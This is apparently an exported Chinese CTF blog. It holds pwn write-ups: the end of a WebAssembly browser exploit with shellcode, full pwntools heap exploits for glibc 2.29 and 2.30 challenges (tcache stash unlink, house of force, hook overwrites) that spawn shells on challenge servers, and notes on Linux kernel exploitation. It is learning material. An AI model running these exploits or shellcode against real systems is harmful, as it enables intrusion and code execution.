Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule);var ex = wasmInstance.exports.main;var leak_ex = leak_obj(ex);var data1 = read(leak_ex+0x18n);var data2 = read(data1+0x8n);var data3 = read(data2+0x10n);var data4 = read(data3+0x88n);let buffer = new ArrayBuffer(0x100);let dataview = new DataView(buffer);let leak_buff = leak_obj(buffer);let fake_write = leak_buff+0x20n;write(fake_write,data4);var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];for(var i=0;i&lt;shellcode.length;i++)&#123; dataview.setUint32(4*i,shellcode[i],true);&#125;ex(); 成功弹出计算器： 参考主要参考了这篇文章：https://paper.seebug.org/9463，感谢V1NKe师傅分享]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>browser</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[高校战"疫"ctf twochunk解析]]></title>
    <url>%2F2020%2F03%2F10%2Fgxzyctf2020-twochunk%2F</url>
    <content type="text"><![CDATA[这道twochunk是花了点时间去研究libc-2.30源码解出，算是自己第一次没用现有办法研究出的pwn堆利用题目，一个小突破吧。 队伍的全部wp：http://nextcloud.chamd5.org/index.php/s/EYTZB4zgtqsfcgePS：今天看到出题的t1an5t师傅将这种利用方法叫做tcache stash unlink attack plus 漏洞分析直接看源码吧 12345678910111213141516171819202122232425262728293031323334353637383940414243444546/* If a small request, check regular bin. Since these "smallbins" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if (in_smallbin_range (nb)) &#123; idx = smallbin_index (nb); bin = bin_at (av, idx); if ((victim = last (bin)) != bin) &#123; bck = victim-&gt;bk; if (__glibc_unlikely (bck-&gt;fd != victim)) malloc_printerr ("malloc(): smallbin double linked list corrupted"); set_inuse_bit_at_offset (victim, nb); bin-&gt;bk = bck; bck-&gt;fd = bin; if (av != &amp;main_arena) set_non_main_arena (victim); check_malloced_chunk (av, victim, nb);#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; bck-&gt;fd = bin; tcache_put (tc_victim, tc_idx); &#125; &#125; &#125;#endif 这段代码在glibc2.30版本_int_malloc()函数中，从smallbins中申请出chunk时的一系列操作，我们分解来看：首先是对该chunk进行完整性检测： 12if (__glibc_unlikely (bck-&gt;fd != victim)) malloc_printerr ("malloc(): smallbin double linked list corrupted"); 然后进行unlink 123set_inuse_bit_at_offset (victim, nb);bin-&gt;bk = bck;bck-&gt;fd = bin; 接下来，根据注释可以得知，如果还存在相同字节大小的不同chunk，会将其存放进tcache。 123456789101112131415/* While bin not empty and tcache not full, copy chunks over. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; bck-&gt;fd = bin; tcache_put (tc_victim, tc_idx); &#125; &#125; 整个过程是先将chunk从smallbins链中摘除再将其放入tcache，但对即将存放入tcache的chunk并没有进行完整性检测(bck-&gt;fd != victim)，这样就给了伪造chunk-&gt;bk的条件 利用以上可以做两件事 1.将fake chunk放入tcache中2.可以在fake chunk-&gt;fd中写入一个地址，这个地址通常是main_arena偏移的地址 利用过程构造在smallbins中有两个chunk:修改后面进入的chunk-&gt;bk为fake_chunk1，fd不变，修改fake chunk1-&gt;bk为fake_chunk2：接下来我们申请出一个chunk，再次查看：此时fake_chunk1+0x10进入tcache，fake_chunk2+0x10写入一个libc地址。大功告成！ 注意几点： 1.如果想把chunk放入tcache的同时，还要写入一个地址在fake chunk-&gt;fd中，不仅要提前设置好chunk-&gt;fd，还有chunk-&gt;bk，因为在unlink过程会访问bk（bin-&gt;bk = bck;)，如果是非法地址会导致程序crash。2.设置好tcache剩余chunk的数量 题解对于这道题来讲，我们可以合理的利用这两个点来搞事情了，首先我们要先构造有两个chunk在smallbins里，而且大小要为0x90,办法有很多，我简单说一下我的思路 1.利用calloc不会从tcache中申请，这样我们可以先将tcache填满再calloc申请chunk然后free掉，不会浪费我们仅有的两个位置2.释放进入tcache的chunk不会与top chunk或其他bins合并3.要先leak堆地址用来当写入chunk-&gt;bk时，恢复chunk-&gt;fd4.malloc出来的chunk大小为0xe9却可以输入23333字节，导致堆溢出来修改free chunk-&gt;bk 完整exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *context.log_level = &apos;debug&apos;prog = &apos;./twochunk&apos;#p = process(prog)libc = ELF(&quot;../libc-2.30.so&quot;)p = remote(&quot;121.36.209.145&quot;, 9999) def add(idx, size): p.sendlineafter(&quot;choice: &quot;, &apos;1&apos;) p.sendlineafter(&quot;idx: &quot;, str(idx)) p.sendlineafter(&quot;size: &quot;, str(size))def edit(idx, content): p.sendlineafter(&quot;choice: &quot;, &apos;4&apos;) p.sendlineafter(&quot;idx: &quot;, str(idx)) p.sendafter(&quot;content: &quot;, content)def free(idx): p.sendlineafter(&quot;choice: &quot;, &apos;2&apos;) p.sendlineafter(&quot;idx: &quot;, str(idx))def show(idx): p.sendlineafter(&quot;choice: &quot;, &apos;3&apos;) p.sendlineafter(&quot;idx: &quot;, str(idx))def showmsg(): p.sendlineafter(&quot;choice: &quot;, &apos;5&apos;)def malloc(content): p.sendlineafter(&quot;choice: &quot;, &apos;6&apos;) p.sendafter(&quot;message: &quot;, content)def hack(): p.sendlineafter(&quot;choice: &quot;, &apos;7&apos;)def exp(): p.sendafter(&quot;leave your name: &quot;, p64(0x23333030-0x10)*6) p.sendlineafter(&quot;message: &quot;, p64(0x23333000)*6) for i in range(6): add(0, 0xe9) free(0) for i in range(5): add(0, 0x88) free(0) for i in range(7): add(0, 0x130) free(0) add(0, 0xe9) add(1, 0x130) free(0) add(0, 0x100) free(0) add(0, 0x130) free(1) add(1, 0x140) free(1) add(1, 0xe9) free(0) free(1) add(0, 0xa8) add(1, 0xa8) free(1) free(0) add(1, 0x150) add(0, 23333) show(0) heap = u64(p.recv(6)+&apos;\x00&apos;*2) log.info(&quot;heap ==&gt;&quot; + hex(heap)) edit(0, &apos;a&apos;*416+p64(0)+p64(0x91)+p64(heap+0x1080)+p64(0x23333000-0x10)) free(1) add(1, 0x88) showmsg() p.recv(0x15) libc.address = u64(p.recvuntil(&apos;\x7f&apos;)[-6:]+&apos;\x00&apos;*2)-0x00007f7b2def2c60+0x7f7b2dd08000 log.info(&quot;libc.address ==&gt;&quot; + hex(libc.address)) payload = p64(libc.sym[&apos;system&apos;])+&apos;\x00&apos;*0x28+p64(0x23333048)+p64(0)+p64(0)+&apos;/bin/sh\x00&apos; malloc(payload) hack() p.interactive()if __name__ == &apos;__main__&apos;: exp()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020CTF公益赛以及针对libc2.29的一些研究]]></title>
    <url>%2F2020%2F02%2F24%2Fgyctf-2020%2F</url>
    <content type="text"><![CDATA[主要总结了libc-2.29的一些新的机制和利用办法。 document题目没给libc文件，通过对远程靶机连续free两个相同chunk，发现在tcache中报错double free，猜测远程为libc-2.29。这道题主要针对的是libc-2.29的一些新的特性，先看一下源码： 123456typedef struct tcache_entry&#123; struct tcache_entry *next; /* This field exists to detect double frees. */ struct tcache_perthread_struct *key;&#125; tcache_entry; 在tcache_entry中新加入了一个指针key，位于chunk-&gt;bk 12345678910111213tcache_put (mchunkptr chunk, size_t tc_idx)&#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); /* Mark this chunk as "in the tcache" so the test in _int_free will detect a double free. */ e-&gt;key = tcache; e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);&#125; 当chunk被释放进入tcache时调用tcache_put()，在libc-2.29版本中会将chunk-&gt;key指向tcache头。 123456789101112131415161718192021222324252627282930313233#if USE_TCACHE &#123; size_t tc_idx = csize2tidx (size); if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; /* Check to see if it's already in the tcache. */ tcache_entry *e = (tcache_entry *) chunk2mem (p); /* This test succeeds on double free. However, we don't 100% trust it (it also matches random payload data at a 1 in 2^&lt;size_t&gt; chance), so verify it's not an unlikely coincidence before aborting. */ if (__glibc_unlikely (e-&gt;key == tcache)) &#123; tcache_entry *tmp; LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next) if (tmp == e) malloc_printerr ("free(): double free detected in tcache 2"); /* If we get here, it was a coincidence. We've wasted a few cycles, but don't abort. */ &#125; if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) &#123; tcache_put (p, tc_idx); return; &#125; &#125; &#125;#endif 在tcache中新添加一条检测，当被释放的chunk-&gt;key为tcache时会遍历tcache链表，如果找到相同chunk会报错double free，这个检测看起来比fastbins还凶残，因为fastbins只会检测链表头部，不过若是仔细思考如果我们能够更改掉key，也就是chunk-&gt;bk，那么这条检测就很好pass掉了。猜测这道题目出题人就是为了这个考点特意加上一个更改sex的功能（sex位于chunk-&gt;bk），加上我们可以利用free后未将指针清零，进行double free完整exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *prog = './pwn'p = process(prog)libc = ELF("/home/luckyu/Desktop/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so")#p = remote("123.56.85.29", 4807)def dbg(b= ''): gdb.attach(p, b) if b == '': p.interactive() def add(name='a'*8, content= 'a'*0x70): p.sendlineafter("choice : \n", '1') p.sendafter("name\n", name) p.sendafter("sex\n", 'W') p.sendafter("information\n", content.ljust(0x70, '\x00'))def show(idx): p.sendlineafter("choice : \n", '2') p.sendlineafter("index : \n", str(idx))def edit(idx, content='\x00'): p.sendlineafter("choice : \n", '3') p.sendlineafter("index : \n", str(idx)) p.sendlineafter("sex?", 'Y') p.sendafter("information\n", content.ljust(0x70, '\x00'))def free(idx): p.sendlineafter("choice : \n", '4') p.sendlineafter("index : \n", str(idx))def exp(): add()#0 add()#1 free(0) free(1) show(1) heap = u64(p.recv(6)+'\x00'*2)-0x270 log.info("heap =" + hex(heap)) edit(1) free(1) add(p64(heap), 'a')#2 add()#3 add('a'*8, '\xff'*0x10)#4 free(3) show(3) libc.address = u64(p.recv(6)+'\x00'*2)-0x7f220c6b7ca0+0x7f220c4d3000 log.info("libc.address ==&gt; " + hex(libc.address)) edit(4,'\x00'*0x10+p64(libc.sym['__free_hook'])*12) add(p64(libc.sym['system']), 'a')#5 add('/bin/sh\x00', 'a')#6 free(6) #dbg() p.interactive()if __name__ == '__main__': exp() signin这道题可以和document拿到一起看，同样是libc-2.29，先看一段源码： 123456789101112131415/* While bin not empty and tcache not full, copy chunks. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != NULL) &#123; if (SINGLE_THREAD_P) *fb = tc_victim-&gt;fd; else &#123; REMOVE_FB (fb, pp, tc_victim); if (__glibc_unlikely (tc_victim == NULL)) break; &#125; tcache_put (tc_victim, tc_idx); &#125;&#125; 这段代码出现在malloc.c在处理fastbins中，结合注释我们可以看到，在fastbins取下一个chunk后，如果fastbins未空且tcache未满，会调用tcache_put()将剩余chunk加入到tcache中，结合我们之前对tcache_put()这个函数的了解，会在chunk-&gt;bk的位置写入一个key，利用这点，我们就足以pass掉程序的限制getshell，但是如何在还有众多tcache之中去从fastbins申请到chunk呢，观察到在执行system(“/bin/sh”)前，程序执行了calloc函数，不禁发问缘由，通过查找发现calloc并不会从tcache中申请chunk，那么我们就可以愉快的从fastbins中申请了。exp: 12345678910111213141516171819202122232425262728from pwn import *context.log_level = 'debug'prog = './pwn'p = process(prog)#p = remote("123.56.85.29",4205) def add(idx): p.sendlineafter("choice?", '1') p.sendlineafter("idx?\n", str(idx))def edit(idx, content): p.sendlineafter("choice?", '2') p.sendlineafter("idx?\n", str(idx)) p.send(content)def free(idx): p.sendlineafter("choice?", '3') p.sendlineafter("idx?\n", str(idx))def exp(): for i in range(9): add(i) for i in range(9): free(i) edit(8, p64(0x4040a8)) add(0) p.sendlineafter("choice?", '6') dbg() p.interactive()if __name__ == '__main__': exp() 等等，这道题还没有结束，其实还有一个更简单的利用办法，我们再来看一段源码： 12345678910tcache_get (size_t tc_idx)&#123; tcache_entry *e = tcache-&gt;entries[tc_idx]; assert (tc_idx &lt; TCACHE_MAX_BINS); assert (tcache-&gt;entries[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next; --(tcache-&gt;counts[tc_idx]); e-&gt;key = NULL; return (void *) e;&#125; 有put就有get，当从tcache中申请chunk后，tcache_get()会将chunk-&gt;key清零，这道题其实可以间接利用的这个特性，将控制edit使用次数的cnt清零，我们就可以再利用一次edit，这样就可以直接写数据到ptr了。 12345678def exp(): add(0) free(0) edit(0, p64(0x4040bc-8)) add(0) add(0) edit(0, 'a'*13) p.sendlineafter("choice?", '6') borrowstack一道栈迁移到bss段执行的题目，比较中规中矩，注意在迁移位置前留一段合法访问空间即可，因为在函数调用过程可能会访问到前面的空间。exp: 123456789101112131415161718192021222324from pwn import * #p = process("./borrowstack")p = remote("123.56.85.29", 3635)elf = ELF("./borrowstack")libc = ELF("../libc-2.23.so")lev_ret = 0x400699bss = 0x601080read = 0x400680pop_rdi = 0x400703pop_rsi_r15=0x400701#gdb.attach(p, 'b*0x400699')payload = 'a'*0x60+p64(bss+0x40)+p64(lev_ret)#p64(0x400660)p.sendafter("\n", payload)rop1 = p64(bss)*0x9+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(pop_rdi)+p64(0)+p64(pop_rsi_r15)+p64(bss)+p64(bss+0x60)+p64(elf.plt['read'])p.sendafter("\n", rop1)puts_addr = u64(p.recv(6)+'\x00'*2)log.info("puts_addr==&gt; " + hex(puts_addr))libc.address = puts_addr - libc.sym['puts']#sleep(0.1)rop2 = 'a'*(0x118-0x88)+p64(libc.address+0x4526a)#p64(pop_rdi)+'/bin/sh\x00'+p64(libc.sym['system'])p.sendline(rop2)p.interactive() force看名识题，程序中只有add()，没限定申请的size,且有明显的堆溢出，故采用house of forceexp: 12345678910111213141516171819202122232425262728293031323334353637from pwn import *#p = process("./pwn1")p = remote("node3.buuoj.cn", 25014)libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")def dbg(): gdb.attach(p) p.interactive()def add(size, content): p.sendline("1") p.sendlineafter("size\n", str(size)) p.sendafter("content\n", content)def exp(): p.sendline("1") p.sendlineafter("size\n", str(0x200000)) p.recvuntil("0x") libc.address = int(p.recv(12), 16)-0x7f9bdf4f5010+0x7f9bdf6f6000 p.sendafter("content\n", 'aa') log.info("libc.address == &gt;" + hex(libc.address)) p.sendline("1") p.sendlineafter("size\n", str(0x18)) p.recvuntil("0x") heap = int(p.recv(12), 16) p.sendafter("content\n", 'a'*0x18+'\xff'*8) log.info("heap="+hex(heap)) offset = libc.sym['__malloc_hook'] -heap- 0x40 log.info("offset = " + str(offset)) add(offset, 'a') add(0x18, '\x00'*8+p64(libc.address+0x4526a)+p64(libc.sym['__libc_realloc']+4)) p.recvuntil("puts\n") p.sendline(str(1)) p.recvuntil("size\n") # pause() p.sendline(str(0)) p.interactive() if __name__ == '__main__': exp() Some_thing_exceting题目漏洞很简单，利用UAF就可以泄露存在堆中的flag，但是在本地调试过程中由于程序使用open(“/flag”)，无法打开本地文件(open返回值是0)，我选择了用IDA patch源文件将其改为open(“flag”)exp: 123456789101112131415161718192021222324252627from pwn import *prog = &apos;./excited&apos;#p = process(prog)p = remote(&quot;123.56.85.29&quot;, 6484) def add(size1, content1, size2, content2): p.sendlineafter(&quot;do :&quot;, &apos;1&apos;) p.sendlineafter(&quot;ba&apos;s length : &quot;, str(size1)) p.sendafter(&quot;ba : &quot;, content1) p.sendlineafter(&quot;na&apos;s length : &quot;, str(size2)) p.sendafter(&quot;na : &quot;, content2)def show(idx): p.sendlineafter(&quot;do :&quot;, &apos;4&apos;) p.sendlineafter(&quot;ID : &quot;, str(idx))def free(idx): p.sendlineafter(&quot;do :&quot;, &apos;3&apos;) p.sendlineafter(&quot;ID : &quot;, str(idx))def exp(): add(0x20, &apos;aaa&apos;, 0x20, &apos;bbb&apos;)#0 add(0x20, &apos;aaa&apos;, 0x20, &apos;bbb&apos;)#1 free(0) free(1) add(0x10, p64(0x6020a8), 0x20, &apos;bbb&apos;) show(0) p.interactive()if __name__ == &apos;__main__&apos;: exp() Some_thing_interesting其实这道题有一个格式化字符串漏洞在开头，比赛时候审题不严谨没有看到（TCL！），我是利用uaf，并通过一些堆块的摆放，制造heap overlap修改heap size为0x90然后释放，从而leak libc，然后再次利用uaf修malloc_hook从而执行one_gadgetexp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *context.log_level = 'debug'prog = './interested'elf = ELF(prog)#p = process(prog)#,env=&#123;"LD_PRELOAD":"./libc.so.6"&#125;)libc = ELF("../libc-2.23.so")p = remote("123.56.85.29", 3041)def dbg(b= ''): gdb.attach(p, b) if b == '': p.interactive()def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr)))def add(size1, content1, size2, content2): p.sendlineafter("do :", '1') p.sendlineafter("length : ", str(size1)) p.sendafter(": ", content1) p.sendlineafter("length : ", str(size2)) p.sendafter(": ", content2)def edit(idx, content1, content2): p.sendlineafter("do :", '2') p.sendlineafter("ID : ", str(idx)) p.sendafter(": ", content1) p.sendafter(": ", content2)def show(idx): p.sendlineafter("do :", '4') p.sendlineafter("ID : ", str(idx))def free(idx): p.sendlineafter("do :", '3') p.sendlineafter("ID : ", str(idx))def exp(): passwd = 'OreOOrereOOreO'.ljust(0x13, 'a') p.sendafter(':', passwd) add(0x60, (p64(0)+p64(0x71))*3, 0x60, (p64(0)+p64(0x71))*3)#1 free(1) edit(1, '\x20', '\x20') add(0x60, (p64(0)+p64(0x91))*3, 0x60, (p64(0)+p64(0x91))*3)#2 edit(1, (p64(0)+p64(0x91))*3, (p64(0)+p64(0x31))*4) free(2) show(2) libc.address = u64(p.recvuntil("\x7f")[-6:]+'\x00'*2)-0x7f7c98860b78+0x7f7c9849c000 edit(1, p64(libc.sym['__malloc_hook']-0x23), p64(libc.sym['__malloc_hook']-0x23)) log.info("libc.address ==&gt; " + hex(libc.address)) payload = '\x00'*0x13+p64(libc.address+0xf1147) add(0x60, payload, 0x60, payload) #dbg() p.interactive()if __name__ == '__main__': exp() 吃鸡游戏唯二做出的逆向题，另一个用的原始人办法，略蠢就不提了。这是一个QT编写的程序，在网上查到一个QT按钮的特征码，OD中二进制查找，单步调式会找到cmp函数，rax寄存器就是对应的密码]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux kernel初探]]></title>
    <url>%2F2020%2F02%2F14%2Flinux-kernel-1%2F</url>
    <content type="text"><![CDATA[最近学习了一些linux kernel的基础知识和几个漏洞的利用办法 进程相关 进程是处于执行期的程序以及相关的资源的总称，是操作系统资源分配的单位。进程的资源包括：1.打开的文件2.挂起的信号3.内核的内部数据4.处理器的状态5.内存映射的内存地址空间 等等 Linux内核通过一个被称为进程描述符的task_struct结构体来管理进程，这个结构体包含了一个进程所需的所有信息。它定义在include/linux/sched.h文件中可以在https://code.woboq.org/linux/linux/include/linux/sched.h.html#task_struct中查看进程的权限是用cred结构体记录的，经常会利用这个结构体来进行提权 1234567891011struct task_struct &#123; /* ... *//* Process credentials: */ /* Tracer's credentials at attach: */ const struct cred __rcu *ptracer_cred; /* Objective and real subjective task credentials (COW): */ const struct cred __rcu *real_cred; /* Effective (overridable) subjective task credentials (COW): */ const struct cred __rcu *cred; /* ... */&#125;; cred结构体定义如下： 123456789101112131415161718192021222324252627282930313233343536373839struct cred &#123; atomic_t usage;#ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers; /* number of processes subscribed */ void *put_addr; unsigned magic;#define CRED_MAGIC 0x43736564#define CRED_MAGIC_DEAD 0x44656144#endif kuid_t uid; /* real UID of the task */ kgid_t gid; /* real GID of the task */ kuid_t suid; /* saved UID of the task */ kgid_t sgid; /* saved GID of the task */ kuid_t euid; /* effective UID of the task */ kgid_t egid; /* effective GID of the task */ kuid_t fsuid; /* UID for VFS ops */ kgid_t fsgid; /* GID for VFS ops */ unsigned securebits; /* SUID-less security management */ kernel_cap_t cap_inheritable; /* caps our children can inherit */ kernel_cap_t cap_permitted; /* caps we&apos;re permitted */ kernel_cap_t cap_effective; /* caps we can actually use */ kernel_cap_t cap_bset; /* capability bounding set */ kernel_cap_t cap_ambient; /* Ambient capability set */#ifdef CONFIG_KEYS unsigned char jit_keyring; /* default keyring to attach requested * keys to */ struct key __rcu *session_keyring; /* keyring inherited over fork */ struct key *process_keyring; /* keyring private to this process */ struct key *thread_keyring; /* keyring private to this thread */ struct key *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY void *security; /* subjective LSM security */#endif struct user_struct *user; /* real user ID subscription */ struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */ struct group_info *group_info; /* supplementary groups for euid/fsgid */ struct rcu_head rcu; /* RCU deletion hook */&#125; __randomize_layout; 其中包含了进程的权限（uid,gid,suid）等信息，如果我们能够修改cred结构体，就修改了这个进程的权限 内核对象缓冲区管理内核对某些对象（如 task_struct）的使用是非常频繁的，所以用户进程堆管理常用的基于搜索的分配算法比如First-Fit（在堆中搜索到的第一个满足请求的内存块）和 Best-Fit（使用堆中满足请求的最合适的内存块）并不直接适用，而应该采用某种缓冲区的机制。现在频繁使用的是linux kernel 2.6.22版本引入的slub的内核对象缓冲区分配器，它逐渐取代了以前的slab分配器。利用slub的分配方式我们可以进行类似于heap uaf的相关利用 漏洞保护机制KASLR类似于ASLR，是内核地址空间随机化，KASLR技术可以让kernel image映射的地址相对于链接地址有个偏移kaslr的主要流程可以分为以下几步： 1.在一个随机的物理地址加载内核 映射内核在vmalloc域的一个随机虚拟地址 映射一些变量以及符号表，偏移地址和image一样 内核地址显示限制通常情况下我们可以利用cat /proc/kallsyms来获得内核相关函数地址，如commit_creds:而Linux kernel可以利用kptr_restrict的值来指示是否限制通过/proc和其他接口暴露内核地址，其数值代表： 0：默认情况下，没有任何限制。1：使用％pK格式说明符打印的内核指针将被替换为0，除非用户具有CAP_ SYSLOG特权2：使用％pK打印的内核指针将被替换为0而不管特权。 当限制查看内核地址时，其地址会显示为0：要禁用该限制可以使用下面命令:sudo sysctl -w kernel.kptr_restrict=0PS:同样的值还有dmesg_restrict,如果我们将其设置为1，就不能通过demsg查看kernel信息了 smep/smap这部分信息和绕过办法在ctf-wiki上有详细说明smep全称是Supervisor Mode Execution Protection，管理模式执行保护其作用是保护内核使其不允许执行用户空间代码，开启smep之后，当CPU处于ring0模式时，执行用户空间的代码会触发页错误。检查smep是否开启：cat /proc/cpuinfo | grep smepsmep保护原理及绕过方法：操作系统是通过CR4寄存器的第20位的值来判断smep是否开启第20位 = 1时：smep开启第20位 = 0时：smep关闭可同通过mov指令给CR4寄存器赋值从而达到关闭smep的目的，相关的mov指令可以通过ropper，ROPgadget等工具查找（推荐使用ropper，相比之下速度更快）。 smap全称是Supervisor Mode Access Protection，管理员模式访问保护，其与smep类似，是通过CR4寄存器的第21位判断。 调试办法如果题目没有给vmlinux，我们需要从内核映像中将其提取，利用extract-vmlinux：./extract-vmlinux ./bzImage &gt; vmlinux然后修改boot.sh加入-gdb tcp:1234，重新打包即可然后启动qemu，由于调试过程我们需要在gdb中加载符号表（为了可以直接对驱动中函数下断点），先查询驱动加载地址：cat /sys/module/core/sections/.text或者cat proc/modules然后在qemu外启动gdb:gdb vmlinux -qpwndbg&gt; add-symbol-file ./babydriver.ko 0xffffffffc0000000pwndbg&gt; target remote:1234这样我们就可以愉快的调试了]]></content>
      <tags>
        <tag>linux kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.tw re-alloc_revenge]]></title>
    <url>%2F2020%2F02%2F05%2Fpwnable-tw-re-alloc-revenge%2F</url>
    <content type="text"><![CDATA[一道pwnable.tw新上的题，环境是libc2.29，在另一道题re-alloc的基础上开启了PIE和RELRO，可以通过这道题学习一些libc2.29、realloc的相关特性 分析程序程序主要有三个功能，malloc申请内存保存数据、realloc重新分配内存以及free释放内存，堆指针由一个全局数组保存，而三种操作中都限制了数组范围只有两个，且free后将数组指针清0，此外，程序还限制了申请空间的大小不大于0x78 前置知识reallocrealloc函数在头文件&lt;stdlib.h&gt;中 1void *realloc(void *ptr,size_t new_size); ptr是将要进行重新分配的内存空间指针（必须在堆中），new_size是想要分配空间的大小realloc主要特性：1.对ptr进行判断，如果ptr为NULL，则相当于malloc(new_size)2.如果ptr不为NULL，会查看ptr是否指向堆上的空间，如果不是会给出异常错误realloc invalid pointer；如果ptr在堆中，则查看new_size的大小，如果new_size为0，相当于free(ptr)，返回NULL；如果new_size小于原空间大小（后面记为old_size)，则ptr中的数据可能会丢失；如果new_size&gt;old_size，会查看ptr指向的空间后面还有没有足够大小的连续空间，如果有的话，继续分配更多的空间，如果没有则将free(ptr)，然后malloc(new_size)，并将内容拷贝到新内存；如果new_size==old_size，则相当于没做什么。以上为网上和结合本人实际应用的大概总结，不过在对于new_size&gt;old_size时其实有些模棱两可，通过这道题我的发现，如果当new_size&lt;old_size，会有可能进行free(ptr+new_size)。如图，一个old_size=0x250的空间：我们将原size为0x250的空间重新分配为0x30的空间，跟踪进入realloc，首先会改写ptr+new_size的内容，使其拥有chunk head：继续调试跟踪，发现调用了free将新的空间释放： libc-2.29在libc-2.29中加入了很多新的防护机制，主要参考自EX师傅的文章：http://blog.eonew.cn/archives/1167总结一下：1.tcache double free难以利用2.增加了对prev_size的检测，会判断prev_size与要合并的chunk的size是否相等3.unsorted bin attack难以利用4.无法进行house of force此外应该还有其他的机制，今后会继续研究 限于（咸鱼）笔者水平太差，做过的2.29版本的pwn题不是很多，遇到的主要利用办法有：1.通过多次malloc和free将同一chunk分别进入tcache和fastbins，造成“double free”2.通过修改tcache struct（tcache虽然被限制了，但是还是一个很好的利用方向）3.可以利用largebin attack代替unsortedbin attack 漏洞利用这道题主要利用了当realloc的size参数为0时可以将指针free掉，且没有将指针清0从而导致UAF，但难点在于程序环境为libc2.29且全局数组只能保存两个指针，并且程序不能申请大于0x78的空间（加大了泄露libc的难度） 泄露libc基址libc-2.29版本存在tcache首先会在heap开头位置创建一个tcache结构体来维护： 12345typedef struct tcache_perthread_struct&#123; char counts[TCACHE_MAX_BINS];//0x40 tcache_entry *entries[TCACHE_MAX_BINS];//0x40*8&#125; tcache_perthread_struct; 其前0x40字节为对应大小tcache的数量，后0x200个字节为指针数组，指向tcache_entry链表的头部指针，针对tcache结构体的利用参考：https://xz.aliyun.com/t/6828这样我们可以利用uaf申请空间到tcahce sturct（需要爆破一字节），然后将tcache的数量改为大于7的数字（由于是无符号比较，-1即可），从而使得tcache不可用，这样free后的chunk就不会进入tcache：然后再利用realloc的特性，重新分配tcache struct这部分空间，可以将多余大小的空间释放掉，使其进入unsorted bin，如果控制好重新分配空间的大小，就足以将unsorted bin链表头写入tcahce指针数组对应的位置：这样如果我们再次申请空间（注意有些size不可用）就会从unsorted bin中申请，恰好可以利用unsorted bin链表头对于libc的偏移量，爆破一字节使得tcache指针指向_IO_2_1_stdout_的位置，这样我们就可以修改其结构体内容从而泄露libc基址 getshell由于我们已经劫持了tcache struct接下来的事情就顺理成章，修改指针指向free_hook将其修改为system然后就可以执行system(“/bin/sh”)来getshell了 完整exp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *context.log_level = 'debug'prog = './re-alloc_revenge'elf = ELF(prog)libc = ELF("libc.so")def dbg(): gdb.attach(p) #if b == '': # p.interactive()def alloc(idx, size, content='a'): p.sendlineafter("choice: ", '1') p.sendlineafter("Index:", str(idx)) p.sendlineafter("Size:", str(size)) p.sendafter("Data:", content)def realloc(idx, size, content='a'): p.sendlineafter("choice: ", '2') p.sendlineafter("Index:", str(idx)) p.sendlineafter("Size:", str(size)) if size != 0: 